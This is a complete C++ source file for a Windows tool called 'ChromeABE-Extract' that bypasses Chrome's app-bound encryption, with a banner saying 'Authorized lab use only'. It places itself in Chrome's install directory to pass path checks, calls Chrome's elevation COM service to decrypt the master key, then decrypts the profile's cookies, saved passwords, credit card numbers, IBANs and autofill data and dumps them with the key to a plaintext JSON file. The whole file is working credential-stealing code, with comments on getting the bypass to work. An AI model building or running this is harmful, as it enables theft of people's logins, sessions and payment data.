#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <objbase.h>
#include <oleauto.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <knownfolders.h>
#include <rpc.h>
#include <sqlite3.h>

#include <cstdio>
#include <cstring>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstdint>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "rpcrt4.lib")

// ============================================================
// Section 1 - COM Interface Definitions
// ============================================================

const CLSID CLSID_Elevator = {
    0x708860E0, 0xF641, 0x4611,
    {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}
};

const IID IID_IElevatorChrome = {
    0x463ABECF, 0x410D, 0x407F,
    {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}
};

const IID IID_IElevator2Chrome = {
    0x1BF5208B, 0x295F, 0x4992,
    {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}
};

interface IElevator : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR* crx_path, const WCHAR* browser_appid,
        const WCHAR* browser_version, const WCHAR* session_id,
        DWORD caller_proc_id, ULONG_PTR* proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        DWORD protection_level, const BSTR plaintext,
        BSTR* ciphertext, DWORD* last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, BSTR* plaintext, DWORD* last_error) = 0;
};

interface IElevator2 : public IElevator {
public:
    virtual HRESULT STDMETHODCALLTYPE RunIsolatedChrome(
        const WCHAR* command_line, const WCHAR* response_endpoint,
        const WCHAR* invitation, HANDLE* proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE AcceptInvitation(
        const WCHAR* invitation, boolean* accepted) = 0;
};

// ============================================================
// Section 2 - Browser Configuration
// ============================================================

struct BrowserConfig {
    const wchar_t* name;
    const wchar_t* exePath;
    const wchar_t* installDir;
    const wchar_t* userDataDir;
};

static const BrowserConfig kChrome = {
    L"Chrome",
    L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    L"C:\\Program Files\\Google\\Chrome\\Application",
    L"Google\\Chrome\\User Data"
};

// ============================================================
// Section 3 - Utility Functions
// ============================================================

static void PrintError(const char* msg, HRESULT hr = S_OK) {
    fprintf(stderr, "[-] %s", msg);
    if (FAILED(hr)) {
        fprintf(stderr, " (HRESULT: 0x%08lx)", (unsigned long)hr);
    }
    fprintf(stderr, "\n");
    fflush(stderr);
}

static std::wstring GetCurrentExePath() {
    wchar_t buf[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    return std::wstring(buf);
}

static std::wstring GetExeDir(const std::wstring& exePath) {
    size_t pos = exePath.find_last_of(L"\\/");
    return (pos == std::wstring::npos) ? L"" : exePath.substr(0, pos);
}

static bool ReadFileToVector(const std::wstring& path, std::vector<BYTE>& out) {
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return false;
    std::streamsize size = f.tellg();
    f.seekg(0, std::ios::beg);
    out.resize(static_cast<size_t>(size));
    return f.read(reinterpret_cast<char*>(out.data()), size).good();
}

static std::string WstringToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1,
                                   nullptr, 0, nullptr, nullptr);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1,
                        &result[0], size, nullptr, nullptr);
    return result;
}

static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    char buf[8];
                    sprintf_s(buf, "\\u%04x", c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

// ============================================================
// Section 4 - Path Spoofing Bootstrap
// ============================================================

static bool EnsureRunningFromChromeDir(const BrowserConfig& browser,
                                       int argc, wchar_t** argv) {
    std::wstring currentExe = GetCurrentExePath();
    std::wstring currentDir = GetExeDir(currentExe);
    std::wstring targetDir  = browser.installDir;

    if (_wcsicmp(currentDir.c_str(), targetDir.c_str()) == 0) {
        wprintf(L"[+] Already running from Chrome's directory.\n");
        return true;
    }

    wprintf(L"[*] Not in Chrome's directory. Bootstrapping...\n");
    wprintf(L"    Current: %ls\n", currentDir.c_str());
    wprintf(L"    Target : %ls\n", targetDir.c_str());

    size_t pos = currentExe.find_last_of(L"\\/");
    std::wstring exeName = (pos == std::wstring::npos)
                           ? currentExe : currentExe.substr(pos + 1);
    std::wstring targetExe = targetDir + L"\\" + exeName;

    if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE)) {
        DWORD err = GetLastError();
        if (err == ERROR_ACCESS_DENIED) {
            PrintError("Access denied writing to Chrome's directory. "
                       "Run the copy step as Administrator, then run the "
                       "copied exe as your NORMAL user (not elevated).");
        } else {
            PrintError("CopyFileW failed", HRESULT_FROM_WIN32(err));
        }
        return false;
    }
    wprintf(L"[+] Copied to: %ls\n", targetExe.c_str());

    std::wstring cmdLine = L"\"" + targetExe + L"\"";
    for (int i = 1; i < argc; i++) {
        cmdLine += L" \"";
        cmdLine += argv[i];
        cmdLine += L"\"";
    }

    wprintf(L"[*] Relaunching from Chrome's directory...\n");
    wprintf(L"[!] NOTE: The relaunched process inherits this process's\n");
    wprintf(L"    token. If you ran this elevated, the relaunch will\n");
    wprintf(L"    also be elevated and DPAPI decryption WILL FAIL with\n");
    wprintf(L"    0x8004a003 / ERROR_ACCESS_DENIED.\n");
    wprintf(L"    Prefer: copy the exe manually as admin, then run it\n");
    wprintf(L"    from a NORMAL (non-elevated) prompt.\n");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(targetExe.c_str(), &cmdLine[0],
                        nullptr, nullptr, FALSE, 0,
                        nullptr, targetDir.c_str(), &si, &pi)) {
        PrintError("CreateProcessW failed", HRESULT_FROM_WIN32(GetLastError()));
        return false;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    wprintf(L"[+] Relaunched. Exiting original instance.\n");
    return false;
}

// ============================================================
// Section 5 - ABE Key Extraction
// ============================================================

static std::vector<BYTE> ExtractEncryptedKeyFromLocalState(
        const std::wstring& userDataDir) {
    std::wstring localStatePath = userDataDir + L"\\Local State";
    std::vector<BYTE> fileData;

    if (!ReadFileToVector(localStatePath, fileData)) {
        PrintError(("Failed to read Local State at: " +
                    WstringToUtf8(localStatePath)).c_str());
        return {};
    }

    std::string json(reinterpret_cast<char*>(fileData.data()), fileData.size());
    std::string key = "\"app_bound_encrypted_key\":\"";
    size_t pos = json.find(key);
    if (pos == std::string::npos) {
        PrintError("app_bound_encrypted_key not found in Local State.");
        return {};
    }
    pos += key.length();
    size_t end = json.find('"', pos);
    if (end == std::string::npos) {
        PrintError("Malformed app_bound_encrypted_key.");
        return {};
    }
    std::string b64 = json.substr(pos, end - pos);

    DWORD decodedSize = 0;
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64,
                              nullptr, &decodedSize, nullptr, nullptr)) {
        PrintError("Base64 size query failed.");
        return {};
    }
    std::vector<BYTE> decoded(decodedSize);
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64,
                              decoded.data(), &decodedSize,
                              nullptr, nullptr)) {
        PrintError("Base64 decode failed.");
        return {};
    }
    decoded.resize(decodedSize);

    wprintf(L"[+] Encrypted key: %zu bytes\n", decoded.size());
    return decoded;
}

// Without this, DecryptData returns 0x8004a003 and you'll spend a
// while wondering why. The service refuses the RPC unless the proxy
// is configured with packet privacy + impersonation + dynamic
// cloaking. Every "why doesn't my ABE bypass work" thread ends here.
static bool ConfigureProxySecurity(IUnknown* pUnk, const wchar_t* label) {
    HRESULT hr = CoSetProxyBlanket(
        pUnk,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING
    );
    if (FAILED(hr)) {
        fwprintf(stderr, L"[-] CoSetProxyBlanket (%ls) failed: 0x%08lx\n",
                 label, (unsigned long)hr);
        fflush(stderr);
        return false;
    }
    wprintf(L"[+] Proxy blanket set (%ls).\n", label);
    return true;
}

static IElevator* CreateElevator() {
    IElevator* elevator = nullptr;

    HRESULT hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER,
                                  IID_IElevator2Chrome,
                                  reinterpret_cast<void**>(&elevator));
    if (SUCCEEDED(hr) && elevator) {
        wprintf(L"[+] IElevator2 instance created.\n");
        if (ConfigureProxySecurity(elevator, L"IElevator2")) {
            return elevator;
        }
        elevator->Release();
        elevator = nullptr;
    } else {
        fwprintf(stderr, L"[*] IElevator2 CoCreateInstance: 0x%08lx\n",
                 (unsigned long)hr);
    }

    hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER,
                          IID_IElevatorChrome,
                          reinterpret_cast<void**>(&elevator));
    if (SUCCEEDED(hr) && elevator) {
        wprintf(L"[+] IElevator (legacy) instance created.\n");
        if (ConfigureProxySecurity(elevator, L"IElevator")) {
            return elevator;
        }
        elevator->Release();
        elevator = nullptr;
    } else {
        fwprintf(stderr, L"[*] IElevator CoCreateInstance: 0x%08lx\n",
                 (unsigned long)hr);
    }

    PrintError("Failed to create any IElevator instance");
    return nullptr;
}

static bool DecryptKeyViaCOM(IElevator* elevator,
                             const std::vector<BYTE>& encryptedKey,
                             std::vector<BYTE>& outKey) {
    if (encryptedKey.empty()) {
        PrintError("Encrypted key is empty.");
        return false;
    }

    const BYTE* data = encryptedKey.data();
    size_t dataLen = encryptedKey.size();
    if (dataLen > 4 && memcmp(data, "APPB", 4) == 0) {
        data += 4;
        dataLen -= 4;
        wprintf(L"[*] Stripped APPB header.\n");
    }

    BSTR bstrEncrypted = SysAllocStringByteLen(
        reinterpret_cast<const char*>(data), static_cast<UINT>(dataLen));
    if (!bstrEncrypted) {
        PrintError("SysAllocStringByteLen failed.");
        return false;
    }

    BSTR bstrDecrypted = nullptr;
    DWORD lastError = 0;

    HRESULT hr = elevator->DecryptData(bstrEncrypted, &bstrDecrypted, &lastError);
    SysFreeString(bstrEncrypted);

    if (FAILED(hr) || !bstrDecrypted) {
        PrintError("DecryptData failed", hr);
        if (lastError != 0) {
            fprintf(stderr, "    LastError: %lu\n", (unsigned long)lastError);
        }
        if (hr == (HRESULT)0x8004a004) {
            fprintf(stderr, "    0x8004a004 = path validation rejected.\n");
        } else if (hr == (HRESULT)0x8004a003) {
            fprintf(stderr,
                "    0x8004a003 = EPT_S_NOT_REGISTERED / access denied.\n"
                "    Run: net start \"GoogleChromeElevationService\"\n"
                "    And run from a NON-elevated cmd prompt.\n");
        }
        fflush(stderr);
        return false;
    }

    UINT len = SysStringByteLen(bstrDecrypted);
    outKey.assign(reinterpret_cast<BYTE*>(bstrDecrypted),
                  reinterpret_cast<BYTE*>(bstrDecrypted) + len);
    SysFreeString(bstrDecrypted);

    wprintf(L"[+] Master key decrypted: %zu bytes\n", outKey.size());
    return true;
}

// ============================================================
// Section 6 - AES-256-GCM Blob Decryption (shared by all data types)
// ============================================================

// Decrypts any v20 blob: [ "v20" | nonce(12) | ciphertext | tag(16) ]
static bool DecryptV20Blob(const std::vector<BYTE>& key,
                           const std::vector<BYTE>& blob,
                           std::string& outPlaintext) {
    if (blob.size() < 3 + 12 + 16) return false;
    if (blob[0] != 'v' || blob[1] != '2' || blob[2] != '0') return false;
    if (key.size() != 32) return false;

    const BYTE* nonce = blob.data() + 3;
    const BYTE* ct    = blob.data() + 3 + 12;
    SIZE_T ctLen      = blob.size() - 3 - 12 - 16;
    const BYTE* tag   = blob.data() + blob.size() - 16;

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    bool ok = false;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
        return false;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
                                   (PUCHAR)key.data(), 32, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag   = (PUCHAR)tag;
    authInfo.cbTag   = 16;

    std::vector<BYTE> plain(ctLen);
    ULONG produced = 0;
    NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)ct, (ULONG)ctLen,
                                &authInfo, nullptr, 0,
                                plain.data(), (ULONG)plain.size(),
                                &produced, 0);
    if (st == 0) {
        outPlaintext.assign(reinterpret_cast<char*>(plain.data()), produced);
        ok = true;
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

// NULL-safe column read — sqlite3_column_text can return NULL for
// empty rows and we don't want to construct std::string from NULL.
static std::string ColText(sqlite3_stmt* stmt, int col) {
    const char* s = reinterpret_cast<const char*>(sqlite3_column_text(stmt, col));
    return s ? std::string(s) : std::string();
}

// Decrypt a v20 blob column. Returns true if the column held a v20
// blob (whether or not decryption succeeded), false if it wasn't v20.
// On v20 decrypt failure, out is set to the literal "<decryption failed>".
static bool TryDecryptBlobColumn(sqlite3_stmt* stmt, int col,
                                 const std::vector<BYTE>& key,
                                 std::string& out) {
    out.clear();
    const void* blob = sqlite3_column_blob(stmt, col);
    int blobLen      = sqlite3_column_bytes(stmt, col);
    if (!blob || blobLen <= 0) return false;

    std::vector<BYTE> enc(reinterpret_cast<const BYTE*>(blob),
                          reinterpret_cast<const BYTE*>(blob) + blobLen);
    if (enc.size() < 3 || enc[0] != 'v' || enc[1] != '2' || enc[2] != '0')
        return false;

    if (!DecryptV20Blob(key, enc, out))
        out = "<decryption failed>";
    return true;
}

// ============================================================
// Section 7 - Data Records
// ============================================================

struct CookieRecord {
    std::string host, name, value, path;
    int64_t     expires = 0;
    bool        secure = false, httponly = false;
};

struct PasswordRecord {
    std::string origin, action, username, password;
    int64_t     date_created = 0;
    int         times_used = 0;
};

struct CardRecord {
    std::string name_on_card, nickname, card_number;
    int         exp_month = 0, exp_year = 0;
};

struct IbanRecord {
    std::string nickname, value;
};

struct AutofillRecord {
    std::string name, value;
};

// ============================================================
// Section 8 - Extractors
// ============================================================

static std::vector<CookieRecord> ExtractCookies(
        const std::wstring& dbPath, const std::vector<BYTE>& key) {
    std::vector<CookieRecord> results;
    std::string dbUtf8 = WstringToUtf8(dbPath);
    sqlite3* db = nullptr;

    if (sqlite3_open_v2(dbUtf8.c_str(), &db,
                        SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        return results;
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db,
            "SELECT host_key, name, encrypted_value, path, "
            "expires_utc, is_secure, is_httponly FROM cookies;",
            -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        return results;
    }

    int total = 0, dec = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        total++;
        std::string val;
        if (!TryDecryptBlobColumn(stmt, 2, key, val)) continue;

        CookieRecord r;
        r.host     = ColText(stmt, 0);
        r.name     = ColText(stmt, 1);
        r.value    = val;
        r.path     = ColText(stmt, 3);
        r.expires  = sqlite3_column_int64(stmt, 4);
        r.secure   = sqlite3_column_int(stmt, 5) != 0;
        r.httponly = sqlite3_column_int(stmt, 6) != 0;
        if (val != "<decryption failed>") dec++;
        results.push_back(std::move(r));
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    wprintf(L"[*] Cookies:    %d total, %d decrypted\n", total, dec);
    return results;
}

static std::vector<PasswordRecord> ExtractPasswords(
        const std::wstring& dbPath, const std::vector<BYTE>& key) {
    std::vector<PasswordRecord> results;
    std::string dbUtf8 = WstringToUtf8(dbPath);
    sqlite3* db = nullptr;

    if (sqlite3_open_v2(dbUtf8.c_str(), &db,
                        SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        wprintf(L"[*] Passwords:  (Login Data not found)\n");
        return results;
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db,
            "SELECT origin_url, action_url, username_value, "
            "password_value, date_created, times_used FROM logins;",
            -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        wprintf(L"[*] Passwords:  (logins table missing)\n");
        return results;
    }

    int total = 0, dec = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        total++;
        std::string val;
        if (!TryDecryptBlobColumn(stmt, 3, key, val)) continue;

        PasswordRecord r;
        r.origin       = ColText(stmt, 0);
        r.action       = ColText(stmt, 1);
        r.username     = ColText(stmt, 2);
        r.password     = val;
        r.date_created = sqlite3_column_int64(stmt, 4);
        r.times_used   = sqlite3_column_int(stmt, 5);
        if (val != "<decryption failed>") dec++;
        results.push_back(std::move(r));
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    wprintf(L"[*] Passwords:  %d total, %d decrypted\n", total, dec);
    return results;
}

static std::vector<CardRecord> ExtractCreditCards(
        const std::wstring& dbPath, const std::vector<BYTE>& key) {
    std::vector<CardRecord> results;
    std::string dbUtf8 = WstringToUtf8(dbPath);
    sqlite3* db = nullptr;

    if (sqlite3_open_v2(dbUtf8.c_str(), &db,
                        SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        wprintf(L"[*] Cards:      (Web Data not found)\n");
        return results;
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db,
            "SELECT name_on_card, expiration_month, expiration_year, "
            "card_number_encrypted, nickname FROM credit_cards;",
            -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        wprintf(L"[*] Cards:      (credit_cards table missing)\n");
        return results;
    }

    int total = 0, dec = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        total++;
        std::string val;
        if (!TryDecryptBlobColumn(stmt, 3, key, val)) continue;

        CardRecord r;
        r.name_on_card = ColText(stmt, 0);
        r.exp_month    = sqlite3_column_int(stmt, 1);
        r.exp_year     = sqlite3_column_int(stmt, 2);
        r.card_number  = val;
        r.nickname     = ColText(stmt, 4);
        if (val != "<decryption failed>") dec++;
        results.push_back(std::move(r));
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    wprintf(L"[*] Cards:      %d total, %d decrypted\n", total, dec);
    return results;
}

static std::vector<IbanRecord> ExtractIbans(
        const std::wstring& dbPath, const std::vector<BYTE>& key) {
    std::vector<IbanRecord> results;
    std::string dbUtf8 = WstringToUtf8(dbPath);
    sqlite3* db = nullptr;

    if (sqlite3_open_v2(dbUtf8.c_str(), &db,
                        SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        wprintf(L"[*] IBANs:      (Web Data not found)\n");
        return results;
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db,
            "SELECT nickname, value FROM local_ibans;",
            -1, &stmt, nullptr) != SQLITE_OK) {
        // Older Chrome builds stored IBANs under a plain "ibans" table
        if (sqlite3_prepare_v2(db,
                "SELECT nickname, value FROM ibans;",
                -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            wprintf(L"[*] IBANs:      (ibans table missing)\n");
            return results;
        }
    }

    int total = 0, dec = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        total++;
        std::string val;
        if (!TryDecryptBlobColumn(stmt, 1, key, val)) continue;

        IbanRecord r;
        r.nickname = ColText(stmt, 0);
        r.value    = val;
        if (val != "<decryption failed>") dec++;
        results.push_back(std::move(r));
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    wprintf(L"[*] IBANs:      %d total, %d decrypted\n", total, dec);
    return results;
}

static std::vector<AutofillRecord> ExtractAutofill(
        const std::wstring& dbPath, const std::vector<BYTE>& key) {
    std::vector<AutofillRecord> results;
    std::string dbUtf8 = WstringToUtf8(dbPath);
    sqlite3* db = nullptr;

    if (sqlite3_open_v2(dbUtf8.c_str(), &db,
                        SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        wprintf(L"[*] Autofill:   (Web Data not found)\n");
        return results;
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db,
            "SELECT name, value FROM autofill;",
            -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        wprintf(L"[*] Autofill:   (autofill table missing)\n");
        return results;
    }

    int total = 0, dec = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        total++;
        std::string val;

        // Autofill is mostly plaintext (names, addresses). Some
        // fields — SSN-adjacent, payment-adjacent — are v20 blobs.
        // Try to decrypt; if the column wasn't v20, fall back to the
        // raw text value.
        if (TryDecryptBlobColumn(stmt, 1, key, val)) {
            if (val != "<decryption failed>") dec++;
        } else {
            val = ColText(stmt, 1);
        }

        AutofillRecord r;
        r.name  = ColText(stmt, 0);
        r.value = val;
        results.push_back(std::move(r));
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    wprintf(L"[*] Autofill:   %d total, %d v20 decrypted\n", total, dec);
    return results;
}

// ============================================================
// Section 9 - JSON Output
// ============================================================

static std::string HexString(const std::vector<BYTE>& key) {
    std::string s;
    s.reserve(key.size() * 2);
    char buf[3];
    for (BYTE b : key) {
        sprintf_s(buf, "%02x", b);
        s += buf;
    }
    return s;
}

static bool WriteAllJSON(
        const std::wstring& outPath,
        const std::string& browser,
        const std::string& profile,
        const std::vector<BYTE>& key,
        const std::vector<CookieRecord>& cookies,
        const std::vector<PasswordRecord>& passwords,
        const std::vector<CardRecord>& cards,
        const std::vector<IbanRecord>& ibans,
        const std::vector<AutofillRecord>& autofill) {

    std::ofstream f(outPath);
    if (!f) {
        PrintError(("Cannot open output: " + WstringToUtf8(outPath)).c_str());
        return false;
    }

    std::ostringstream oss;

    oss << "{\n";
    oss << "  \"browser\": \""        << JsonEscape(browser) << "\",\n";
    oss << "  \"profile\": \""        << JsonEscape(profile) << "\",\n";
    oss << "  \"master_key_hex\": \"" << HexString(key)      << "\",\n";
    oss << "  \"counts\": {\n";
    oss << "    \"cookies\":   " << cookies.size()   << ",\n";
    oss << "    \"passwords\": " << passwords.size() << ",\n";
    oss << "    \"cards\":     " << cards.size()     << ",\n";
    oss << "    \"ibans\":     " << ibans.size()     << ",\n";
    oss << "    \"autofill\":  " << autofill.size()  << "\n";
    oss << "  },\n";

    // ---- Cookies ----
    oss << "  \"cookies\": [\n";
    for (size_t i = 0; i < cookies.size(); i++) {
        const auto& c = cookies[i];
        oss << "    { \"host\": \""   << JsonEscape(c.host)  << "\", "
            << "\"name\": \""         << JsonEscape(c.name)  << "\", "
            << "\"value\": \""        << JsonEscape(c.value) << "\", "
            << "\"path\": \""         << JsonEscape(c.path)  << "\", "
            << "\"expires\": "        << c.expires            << ", "
            << "\"secure\": "         << (c.secure   ? "true" : "false") << ", "
            << "\"httponly\": "       << (c.httponly ? "true" : "false") << " }"
            << (i + 1 < cookies.size() ? "," : "") << "\n";
    }
    oss << "  ],\n";

    // ---- Passwords ----
    oss << "  \"passwords\": [\n";
    for (size_t i = 0; i < passwords.size(); i++) {
        const auto& p = passwords[i];
        oss << "    { \"origin\": \""   << JsonEscape(p.origin)   << "\", "
            << "\"action\": \""         << JsonEscape(p.action)   << "\", "
            << "\"username\": \""       << JsonEscape(p.username) << "\", "
            << "\"password\": \""       << JsonEscape(p.password) << "\", "
            << "\"date_created\": "     << p.date_created        << ", "
            << "\"times_used\": "       << p.times_used          << " }"
            << (i + 1 < passwords.size() ? "," : "") << "\n";
    }
    oss << "  ],\n";

    // ---- Credit cards ----
    oss << "  \"credit_cards\": [\n";
    for (size_t i = 0; i < cards.size(); i++) {
        const auto& c = cards[i];
        oss << "    { \"name_on_card\": \"" << JsonEscape(c.name_on_card) << "\", "
            << "\"nickname\": \""           << JsonEscape(c.nickname)     << "\", "
            << "\"exp_month\": "            << c.exp_month                << ", "
            << "\"exp_year\": "             << c.exp_year                 << ", "
            << "\"card_number\": \""        << JsonEscape(c.card_number)  << "\" }"
            << (i + 1 < cards.size() ? "," : "") << "\n";
    }
    oss << "  ],\n";

    // ---- IBANs ----
    oss << "  \"ibans\": [\n";
    for (size_t i = 0; i < ibans.size(); i++) {
        const auto& r = ibans[i];
        oss << "    { \"nickname\": \"" << JsonEscape(r.nickname) << "\", "
            << "\"value\": \""          << JsonEscape(r.value)    << "\" }"
            << (i + 1 < ibans.size() ? "," : "") << "\n";
    }
    oss << "  ],\n";

    // ---- Autofill ----
    oss << "  \"autofill\": [\n";
    for (size_t i = 0; i < autofill.size(); i++) {
        const auto& a = autofill[i];
        oss << "    { \"name\": \"" << JsonEscape(a.name)  << "\", "
            << "\"value\": \""      << JsonEscape(a.value) << "\" }"
            << (i + 1 < autofill.size() ? "," : "") << "\n";
    }
    oss << "  ]\n";

    oss << "}\n";

    f << oss.str();
    f.close();
    wprintf(L"[+] JSON written to: %ls\n", outPath.c_str());
    return true;
}

// ============================================================
// Section 10 - Main
// ============================================================

int wmain(int argc, wchar_t** argv) {
    wprintf(L"==============================================\n");
    wprintf(L"  ChromeABE-Extract - Custom ABE Bypass Tool\n");
    wprintf(L"  Authorized lab use only\n");
    wprintf(L"==============================================\n\n");

    if (!EnsureRunningFromChromeDir(kChrome, argc, argv)) {
        return 0;
    }

    wchar_t* localAppData = nullptr;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr,
                                    &localAppData))) {
        PrintError("SHGetKnownFolderPath failed.");
        return 1;
    }
    std::wstring userDataDir = std::wstring(localAppData)
                                + L"\\" + kChrome.userDataDir;
    CoTaskMemFree(localAppData);

    wprintf(L"[*] User data: %ls\n", userDataDir.c_str());

    // Pull the encrypted master key out of Local State.
    std::vector<BYTE> encryptedKey =
        ExtractEncryptedKeyFromLocalState(userDataDir);
    if (encryptedKey.empty()) return 1;

    // COM init + security context. The impersonation level matters
    // because the elevation service needs to act as us to reach our
    // DPAPI context for the inner decryption layer.
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        PrintError("CoInitializeEx failed", hr);
        return 1;
    }

    CoInitializeSecurity(
        nullptr, -1, nullptr, nullptr,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_DYNAMIC_CLOAKING, nullptr
    );

    IElevator* elevator = CreateElevator();
    if (!elevator) {
        CoUninitialize();
        return 1;
    }

    std::vector<BYTE> masterKey;
    bool ok = DecryptKeyViaCOM(elevator, encryptedKey, masterKey);

    elevator->Release();
    CoUninitialize();

    if (!ok || masterKey.size() != 32) {
        PrintError("Failed to recover a valid 32-byte master key.");
        return 1;
    }

    std::wstring profileDir = userDataDir + L"\\Default";
    std::wstring cookiesDb  = profileDir + L"\\Network\\Cookies";
    std::wstring loginsDb   = profileDir + L"\\Login Data";
    std::wstring webDataDb  = profileDir + L"\\Web Data";

    wprintf(L"\n[*] Extracting data...\n");
    auto cookies   = ExtractCookies(cookiesDb, masterKey);
    auto passwords = ExtractPasswords(loginsDb, masterKey);
    auto cards     = ExtractCreditCards(webDataDb, masterKey);
    auto ibans     = ExtractIbans(webDataDb, masterKey);
    auto autofill  = ExtractAutofill(webDataDb, masterKey);

    std::wstring outPath = L"C:\\testing\\abe_dump.json";
    CreateDirectoryW(L"C:\\testing", nullptr);

    WriteAllJSON(outPath, "Chrome", "Default", masterKey,
                 cookies, passwords, cards, ibans, autofill);

    wprintf(L"\n[+] Done.\n");
    wprintf(L"    Cookies:   %zu\n", cookies.size());
    wprintf(L"    Passwords: %zu\n", passwords.size());
    wprintf(L"    Cards:     %zu\n", cards.size());
    wprintf(L"    IBANs:     %zu\n", ibans.size());
    wprintf(L"    Autofill:  %zu\n", autofill.size());
    wprintf(L"[*] Master key: %hs\n", HexString(masterKey).c_str());

    return 0;
}
